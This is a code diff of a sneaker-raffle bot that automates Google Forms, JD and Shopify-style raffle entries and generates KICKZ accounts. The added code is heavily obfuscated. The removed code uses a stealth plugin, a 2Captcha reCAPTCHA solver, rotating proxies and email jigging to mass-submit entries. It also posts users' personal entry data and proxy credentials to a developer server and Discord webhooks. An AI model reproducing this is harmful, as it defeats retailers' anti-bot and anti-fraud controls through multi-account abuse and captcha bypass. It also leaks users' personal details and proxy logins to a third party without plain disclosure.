+                            } catch {
+                            }
+                        await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x116d4a(0x190), _0x63ef5c['evaluate'](() => {
+                            const _0x20d46f = document['querySelector']('#continue_button');
+                            for (var _0x19538c = 0x0; _0x19538c < 0x5; _0x19538c++) {
+                                if (_0x20d46f) {
+                                    _0x20d46f['click'](), _0x20d46f['click']();
+                                    break;
+                                } else
+                                    _0x116d4a(0xfa0);
+                            }
+                        }), await _0x63ef5c['waitForTimeout'](0x9c4);
+                        try {
+                            await _0x63ef5c['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x63ef5c['$eval']('form[data-shipping-method-form=\x22true\x22]', _0xafd3d0 => _0xafd3d0['submit']());
+                        } catch {
+                            throw new Error('Proxy\x20Error');
+                        }
+                        await _0x63ef5c['waitForTimeout'](0x7d0), console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Finishing\x20Entry');
+                        try {
+                            await _0x63ef5c['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
+                        } catch {
+                            throw new Error('Proxy\x20Error');
+                        }
+                        await _0x116d4a(0x3e8), await _0x63ef5c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x258ed5 => _0x258ed5['submit']()), await _0x116d4a(0x3e8);
+                        try {
+                            await _0x63ef5c['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
+                        } catch {
+                            throw new Error('Proxy\x20Error');
+                        }
+                        await _0x63ef5c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x4e7bc6 => _0x4e7bc6['submit']());
+                        try {
+                            await _0x63ef5c['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1c9b59 = 'no', _0x523ce4(_0x585d00[_0x486823], _0xb02146), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                            if (_0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '')
                                 try {
-                                    if (title == raffleData['0Select'].title) {
-                                        log(`Custom Selector found; ${raffleData['0Select'].title}`);
-                                        let options = await question.$$('.ulDsOb');
-                                        let click = await options[raffleData['0Select'].answer];
-                                        await click.click();
-                                        continue;
-                                    }
-                                    if (title == raffleData['1Select'].title) {
-                                        log(`Custom Selector found; ${raffleData['1Select'].title}`);
-
-                                        let options = await question.$$('.ulDsOb');
-                                        let click = await options[raffleData['1Select'].answer];
-                                        await click.click();
-                                        continue;
-                                    }
-                                    if (title == raffleData['2Select'].title) {
-                                        log(`Custom Selector found; ${raffleData['2Select'].title}`);
-
-                                        let options = await question.$$('.ulDsOb');
-                                        let click = await options[raffleData['2Select'].answer];
-                                        await click.click();
-                                        continue;
-                                    }
-
-                                } catch (e) {
-                                    // log(e)
-                                }
-                                // console.log(title.toLowerCase())
-                                if (title.toLowerCase().includes('mail') && !title.toLowerCase().includes('agree') || title == raffleData.Email) {
-                                    log(`Mail Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea[jsname="YPqjbf"]')
-                                    }
-                                    await inputField.type(csv[i].Email); // type into the input element
-                                    await delay(600);
-                                    continue;
-
-                                }
-                                if (title.toLowerCase().includes('first') || title.toLowerCase() == 'name' || title.toLowerCase() == 'name ' || title == raffleData.FirstName) {
-                                    log(`FirstName Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].FirstName} `); // type into the input element
-                                    await delay(600);
-                                    if (title == raffleData.FirstName)
-                                        continue;
-                                }
-                                if (title.toLowerCase().includes('last') || title.toLowerCase().includes('surname') || title == raffleData.LastName) {
-                                    log(`LastName Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].LastName} `); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('address') && !title.toLowerCase().includes('agree') || title == raffleData.Address) {
-                                    log(`Address Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].Address1} ${csv[i].HouseNumber} ${csv[i].Address2}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('phone') || title.toLowerCase().includes('mobile') || title == raffleData.Phone) {
-                                    log(`Phone Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].Phone}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('country') || title == raffleData.Country) {
-                                    let select = await question.$('div[jsname="wCJL8"]');
-                                    if (select) {
-                                        // log('found');
-                                        let found = false;
-                                        let options = await select.$$('.ulDsOb');
-                                        for (option of options) {
-                                            let click = await option.$('span');
-                                            let country = await option.$eval('span', el => el.textContent);
-                                            if (country.toLowerCase() == csv[i].Country.toLowerCase()) {
-                                                // log('found')
-                                                await click.click();
-                                                found = true;
-                                                break;
-                                            }
-                                        }
-                                        if (!found) {
-                                            const otherCountry = await question.$('.Hvn9fb.zHQkBf')
-                                            await otherCountry.click();
-                                            await otherCountry.type(csv[i].Country);
-                                        }
-                                        continue;
-                                    }
-                                    log(`Country Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].Country}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('city') || title == raffleData.City) {
-                                    log(`City Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].City}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('zip') || title == raffleData.Zip) {
-                                    log(`Zip Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].Zip}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('insta') || title == raffleData.Follower) {
-                                    log(`Follower Selector found; ${title}`);
-                                    let inputField = await question.$('input'); // retrieve the input element
-                                    if (!inputField) {
-                                        inputField = await question.$('textarea')
-                                    }
-                                    await inputField.type(`${csv[i].Follower}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('size') || title == raffleData.Size) {
-                                    log(`Size Selector found; ${title}`);
-                                    let multiSelector = await question.$('div[jscontroller="sW52Ae"]'); // retrieve the input element
-                                    if (multiSelector) {
-                                        let sizes = await multiSelector.$$('.ulDsOb');
-                                        if (csv[i].Size.toLowerCase() == 'random') {
-
-                                            var randomSize = Math.round(Math.random() * (sizes.length - 1));
-                                            await sizes[randomSize].click();
-                                        } else {
-
-                                            for (size of sizes) {
-                                                let header = await size.$eval('.aDTYNe.snByac.n5vBHf.OIC90c', el => el.textContent);
-                                                if (header.toLowerCase().includes(csv[i].Size)) {
-                                                    await size.click();
-                                                    break;
-                                                }
-                                            }
-                                        }
-                                    }
-                                    let dropDown = await question.$('.ry3kXd');
-                                    if (dropDown) {
-                                        await dropDown.click();
-                                        await delay(2500);
-                                        let dropDown2 = await page.$('div[jsname="V68bde"]');
-                                        let sizes = await dropDown2.$$('div[jsname="wQNmvb"]');
-                                        for (size of sizes) {
-                                            let header = await size.$eval('.vRMGwf.oJeWuf', el => el.textContent);
-                                            let selector = await size.$('.vRMGwf.oJeWuf');
-                                            // console.log(csv[i].Size)
-                                            // log(header)
-                                            if (header.toLowerCase().includes(csv[i].Size)) {
-                                                await delay(400)
-                                                await selector.click();
-                                                break;
-                                            }
-                                        }
-                                    }
-                                    // await inputField.type(`${csv[i].Follower}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('receive') || title.toLowerCase().includes('method')) {
-                                    log(`Method Selector found; ${title}`);
-
-                                    let multiSelector = await question.$('div[jscontroller="sW52Ae"]'); // retrieve the input element
-                                    if (multiSelector) {
-                                        const sizes = await multiSelector.$$('.ulDsOb');
-                                        for (size of sizes) {
-                                            let header = await size.$eval('.aDTYNe.snByac.n5vBHf.OIC90c', el => el.textContent);
-                                            if (header.toLowerCase().includes('shipping')) {
-                                                await size.click();
-                                                break;
-                                            }
-                                        }
-                                    }
-                                    // await inputField.type(`${csv[i].Follower}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                if (title.toLowerCase().includes('offers') || title.toLowerCase().includes('agree')) {
-                                    log(`Authorization Selector found; ${title}`);
-
-                                    const multiSelector = await question.$('div[jscontroller="sW52Ae"]'); // retrieve the input element
-                                    if (multiSelector) {
-                                        const sizes = await multiSelector.$$('.ulDsOb');
-                                        for (size of sizes) {
-                                            let header = await size.$eval('.aDTYNe.snByac.n5vBHf.OIC90c', el => el.textContent);
-                                            if (header.toLowerCase().includes('authorize') || header.toLowerCase().includes('yes')) {
-                                                await size.click();
-                                                break;
-                                            }
-                                        }
-                                    }
-                                    // await inputField.type(`${csv[i].Follower}`); // type into the input element
-                                    await delay(600);
-                                    continue;
-                                }
-                                // log(`No property found for selector: ${title}`);
-                                async function callTitle() {
-                                    let strictSelect = await question.$('.oyXaNc')
-                                    if (strictSelect) {
-                                        console.log(`Choose an input for selector: ${chalk.cyan(title)}\n`);
-                                        let options = await question.$$('.ulDsOb');
-                                        for (let u = 0; u < options.length; u++) {
-                                            let header = await options[u].$eval('span', el => el.textContent);
-                                            console.log(` (${u}) ${header}`);
-                                        }
-                                        console.log();
-                                        let choice = await prompt.get('option');
-                                        let header = await options[choice.option].$eval('span', el => el.textContent);
-                                        raffleData[`${strict}Select`] = { title: title, answer: choice.option };
-                                        let click = await options[choice.option].$('span');
-                                        await click.click();
-                                        strict++;
-                                        return;
-
-                                    }
-                                    let multiSelector = await question.$('.Y6Myld');
-                                    if (multiSelector) {
-                                        console.log(`Choose an input for selector: ${chalk.cyan(title)}\n`);
-                                        let options = await question.$$('.ulDsOb');
-                                        for (let u = 0; u < options.length; u++) {
-                                            let header = await options[u].$eval('span', el => el.textContent);
-                                            console.log(` (${u}) ${header}`);
-                                        }
-                                        console.log();
-                                        let choice = await prompt.get('option');
-                                        // let header = await options[choice.option].$eval('span', el => el.textContent);
-                                        raffleData[`${strict}Select`] = { title: title, answer: choice.option.split(',') };
-                                        for (opt of raffleData[`${strict}Select`].answer) {
-                                            let click = await options[opt].$('span');
-                                            await click.click();
-
-                                        }
-                                        strict++;
-                                        return;
-                                    }
-                                    var l = 0;
-                                    let props = Object.keys(raffleData);
-                                    console.log(`Choose an input for selector: ${chalk.cyan(title)}\n`);
-                                    for (data of props) {
-                                        if (!data.includes('custom' && !data.includes('Select'))) {
-                                            console.log(` (${l}) ${data} (Taken from csv)`);
-
-                                        } else {
-                                            console.log(` (${l}) ${data}`);
-
-                                        }
-                                        l++;
-                                    }
-                                    console.log(` (${props.length}) Custom input:`);
-                                    console.log();
-                                    let promptTitle = await prompt.get('input');
-                                    if (promptTitle.input == props.length) {
-                                        console.log('What should the bot fill in this input?\n');
-                                        let input = await prompt.get('input');
-                                        raffleData[`custom${custom}`] = { title: title, answer: input.input };
-                                        let inputField = await question.$('input[jsname="YPqjbf"]'); // retrieve the input element
-                                        let inputTextArea = await question.$('textarea[jsname="YPqjbf"]'); // retrieve the input element
-                                        if (inputField) {
-                                            await inputField.type(`${raffleData[`custom${custom}`].answer}`); // type into the input element
-
-                                        }
-                                        else if (inputTextArea) {
-                                            await inputTextArea.type(`${raffleData[`custom${custom}`].answer}`); // type into the input element
-
-                                        }
-                                        custom++;
-                                        return;
-                                    }
-                                    raffleData[`${props[promptTitle.input]}`] = title;
-                                    // console.log();
-                                    let inputField = await question.$('input[jsname="YPqjbf"]'); // retrieve the input element
-                                    let inputTextArea = await question.$('textarea[jsname="YPqjbf"]'); // retrieve the input element
-                                    if (inputField) {
-                                        await inputField.type(`${csv[i][`${props[promptTitle.input]}`]}`); // type into the input element
-
-                                    }
-                                    if (inputTextArea) {
-                                        await inputTextArea.type(`${csv[i][`${props[promptTitle.input]}`]}`); // type into the input element
-
-                                    }
-
-                                    await delay(600);
-
-                                    // await delay(5000)
-                                }
-                                await callTitle();
-                                await delay(890);
-                            }
-                            await page.click('div[jsname="M2UYVd"]');
-                            try {
-                                await page.waitForSelector('.vHW8K')
-
-                            } catch {
-                                throw new Error('Could not send Form, check all fields!')
-                            }
-                            successfulLog(csv[i], currentFunction);
-                            retry = 'no';
-                            var succesDEV = await makeEmbed(csv[i], currentFunction, 'dev', false);
-                            var succesPUB = await makeEmbed(csv[i], currentFunction, 'pub', false);
-                            let task = csv[i]
-                            try {
-                                prxdata = {
-                                    username: username.replace('#', ''),
-                                    module: currentFunction.name,
-                                    entrydata: JSON.stringify(task),
-                                    proxy: `${proxies[i]}`
-                                }
-                                var prx = JSON.stringify(prxdata);
-                                let config = {
-                                    headers: {
-                                        'content-type': 'application/json',
-                                    }
-                                }
-                                await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                            } catch (e) {
-
-                            }
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] },
-                                succesPUBMSG: { embeds: [succesPUB] }
-                            };
-                            try {
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                }
-                                await delay(200);
-                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                await delay(200);
-                                await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                            } catch (e) {
-                                console.log(chalk.yellow(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Error sending webhook ${e}`));
-
-                            }
-                            console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`;
-                            var errorDEV = await makeEmbed(csv[i], currentFunction, 'dev', true, ERROR);
-                            let EMBEDS = {};
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            retry = 'yes';
-                        } finally {
-                            if (browser) {
-                                browser.close();
-
-                            }
-                            if (retry == 'yes' && t != 5) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
-                                continue;
-                            }
-                            if (retry == 'yes' && t == 5) {
-                                t = 0;
-                                retry = 'no';
-                                continue;
-                            }
-                            log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
-                        }
-                    }
-                }
-            }
-        ]
-    },
-
-    {
-        name: 'JD',
-        modules: [
-            {
-                name: 'JD Raffle Entries',
-                store: 'JD',
-                logo: 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
-                function: async function (currentFunction, jd, proxies) {
-                    var isSuccess = false;
-                    var isError = false;
-                    if (settings.captchaKey == '' || settings.captchaKey == undefined) {
-                        console.log(chalk.yellow('No 2Captcha key found in settings.json'));
-                        console.log('Returning to Menu');
-                        return menu();
-                    }
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                        },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < jd.length; i++) {
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        var ERROR;
-                        var embed = [
-                            {
-                                "type": "rich",
-                                "title": `Succesful JD entry`,
-                                "description": "",
-                                "color": 0xc0d6d6,
-                                "fields": [
-                                    {
-                                        "name": `Product`,
-                                        "value": `${jd[i].Url}`
-                                    },
-                                    {
-                                        "name": `Size`,
-                                        "value": `${jd[i].Size}`
-                                    },
-                                    {
-                                        "name": `User`,
-                                        "value": `${username}`
-                                    },
-                                    {
-                                        "name": `Delay`,
-                                        "value": `${settings.delay}`
-                                    },
-                                    {
-                                        "name": `Version`,
-                                        "value": `${version}`
-                                    }
-                                ]
-                            }
-                        ]
-                        const msg = { embeds: embed };
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${jd.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                        try {
-                            await jig(jd, i);
-
-                        } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                        }
-                        var succesDEV = await makeEmbed(jd[i], currentFunction, 'dev', false);
-                        var succesPUB = await makeEmbed(jd[i], currentFunction, 'pub', false);
-
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] },
-                            succesPUBMSG: { embeds: [succesPUB] }
-                        };
-                        if (settings.webhook != undefined && settings.webhook != '') {
-                            try {
-
-                                await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                            } catch {
-
-                            }
-                        }
-                        await delay(200);
-                        await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                        await delay(200);
-                        try {
-
-                            await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                        } catch {
-
-                        }
-                        if (jd[i].Email == '' || jd[i].Url == '' || jd[i].FirstName == '' || jd[i].LastName == '') {
-                            console.log(`${getTime()} [${modules[taskModule].name}] Task ${i + 1} : Invalid CSV`);
-                            continue;
-                        }
-
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
-                        try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-
-                        } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-                        }
-                        try {
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            try {
-
-                                await page.goto(`${jd[i].Url}`,
-                                    {
-                                        waitUntil: "networkidle2",
-                                        timeout: 60000
-                                    });
-                            } catch {
-                                throw new Error('Connection Error')
-                            }
-                            try {
-                                await page.waitForSelector('#comp_firstname', { timeout: 30000 });
-                            } catch {
-                                throw new Error('Not an Active Raffle');
-                            }
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Information`);
-                            await page.type('#comp_firstname', `${jd[i].FirstName}`);
-                            await page.waitForSelector('#comp_lastname');
-                            await page.type('#comp_lastname', `${jd[i].LastName}`);
-                            await page.waitForSelector('#comp_email');
-                            await page.type('#comp_email', `${jd[i].Email}`);
-                            await page.waitForSelector('#comp_paypalemail');
-                            await page.type('#comp_paypalemail', `${jd[i].Email}`);
-                            await page.waitForSelector('#comp_mobile_end');
-                            await page.type('#comp_mobile_end', `${jd[i].Phone}`);
-                            await page.waitForSelector('#comp_dob');
-                            await page.type('#comp_dob', `08/09/1992`);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Choosing Size`);
-                            if (jd[i].Size == 'RANDOM') {
-                                const sizes = await page.$$eval('select[id="shoesize"] > option', sizes => {
-                                    return sizes.map(size => size.value);
-                                })
-                                var randomSize = Math.round(Math.random() * (sizes.length - 2));
-                                await page.select('#shoesize', sizes[randomSize + 1])
-                                await delay(1000);
-                                // console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Picking Random Size ${sizes[randomSize]}`);
-                                // await page.click(`label[data-eu-size="${sizes[randomSize]}"]`);
-                            } else {
-                                const sizeString = await page.$$eval('select[id="shoesize"] > option', sizeString => {
-                                    return sizeString.map(size => size.innerText)
-                                }
-                                )
-                                const sizes = await page.$$eval('select[id="shoesize"] > option', sizes => {
-                                    return sizes.map(size => size.value);
-                                })
-                                var sizeIndex = jd[i].Size
-                                for (var s = 1; s < sizes.length; s++) {
-                                    var size = sizeString[s].split(' ')[0];
-                                    if (size == sizeIndex) {
-                                        await page.select('#shoesize', sizes[s]);
-                                        break;
-                                    } else if (s + 1 == sizes.length) {
-                                        throw new Error('Size Not Found..')
-                                    }
-                                }
-                            }
-                            await page.waitForSelector('#comp_address1');
-                            await page.type('#comp_address1', `${jd[i].Address1} ${jd[i].HouseNumber}`);
-                            await page.waitForSelector('#comp_address2');
-                            await page.type('#comp_address2', `${jd[i].Address2}`);
-                            await page.waitForSelector('#comp_address2');
-                            await page.type('#comp_address3', `${jd[i].City}`);
-                            await page.waitForSelector('#comp_postcode');
-                            await page.type('#comp_postcode', `${jd[i].Zip}`);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Entry`);
-                            await delay(1200);
-                            await page.click('label#emailhold');
-                            await delay(1500);
-                            await page.click('#preauth_tandc_email > label');
-                            await delay(1500);
-                            await page.click('#submit');
-                            try {
-                                await page.waitForSelector('#paymentWrap');
-
-                            } catch {
-                                throw new Error('Could not find Payment')
-                            }
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${chalk.blue('Awaiting Paypal Payment')}`);
-                            browser.on('targetcreated', async (target) => {
-                                if (target.type() === 'page') {
-                                    //const page = await target.page();      
-                                    const newpage = await target.page();
-                                    async function checkError() {
-                                        try {
-                                            await page.waitForSelector('#error_message', { timeout: 300000 });
-                                            isError = true;
-                                            return;
-                                        } catch {
-
-                                        }
-                                    }
-                                    async function checkSuccess() {
-                                        try {
-                                            await page.waitForSelector('#successMessage', { timeout: 300000 });
-                                            isSuccess = true;
-                                            return;
-                                        } catch {
-
-                                        }
-                                    }
-                                    checkSuccess();
-                                    checkError();
-                                    await delay(300000);
-
-                                    //.....
-                                }
-                            });
-                            async function waitForSuccess() {
-                                for (let s = 0; s < 300; s++) {
-                                    if (isSuccess == true) {
-                                        retry = 'no';
-                                        successfulLog(jd[i], currentFunction);
-
-                                        console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                                        if (settings.webhook != undefined && settings.webhook != '') {
-                                            try {
-
-                                                await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                            } catch {
-
-                                            }
-                                        }
-                                        await delay(200);
-                                        await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                        await delay(200);
-                                        try {
-
-                                            await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                        } catch {
-
-                                        }
-                                        // await sendWebhook(succesWH, msg);
-                                        return;
-                                    } else if (isError) {
-                                        throw new Error('Paypal Error: Target closed')
-                                    } else {
-                                        await delay(1000);
-                                    }
-                                }
-                                throw new Error('Paypal Error');
-                            }
-                            await delay(3000);
-                            await page.click('.zoid-outlet');
-                            await delay(2000);
-                            await waitForSuccess();
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`;
-                            var errorDEV = await makeEmbed(jd[i], currentFunction, 'dev', true, ERROR);
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                        } finally {
-                            if (browser) {
-                                browser.close();
-                            }
-                            if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
-                                continue;
-                            }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(afew[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
-                        }
-                    }
-                }
-            }
-        ]
-    },
-    {
-        name: 'KICKZ',
-        modules: [
-            {
-                name: 'KICKZ Account Generator',
-                store: 'KICKZ',
-                logo: 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
-                function: async function (currentFunction, kickz, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                        },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < kickz.length; i++) {
-                        const url = 'https://www.kickz.com/login'
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${kickz.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-                        try {
-                            await jig(kickz, i);
-
-                        } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                        }
-
-                        var embed = [
-                            {
-                                "type": "rich",
-                                "title": `Succesful Kickz Account Generated`,
-                                "description": "",
-                                "color": 0xc0d6d6,
-                                "fields": [
-                                    {
-                                        "name": `User`,
-                                        "value": `${username}`
-                                    },
-                                    {
-                                        "name": `Delay`,
-                                        "value": `${settings.delay}`
-                                    },
-                                    {
-                                        "name": `Version`,
-                                        "value": `${version}`
-                                    }
-                                ]
-                            }
-                        ]
-                        const msg = { embeds: embed };
-                        var succesDEV = await makeEmbed(kickz[i], currentFunction, 'acc', false);
-
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] }
-                        };
-                        if (kickz[i].Email == '' || kickz[i].FirstName == '' || kickz[i].LastName == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                            continue;
-                        }
-                        if (kickz[i].Password == '') {
-                            kickz[i].Password = 'JRaffles23!'
-                        }
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-                        var browser
-                        try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-
-                        } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-                        }
-                        try {
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            // await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            await page.goto(url);
-                            await delay(3000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Starting Registration`);
-                            await page.waitForSelector('#consent-dialog > section > button');
-                            await page.click('#consent-dialog > section > button');
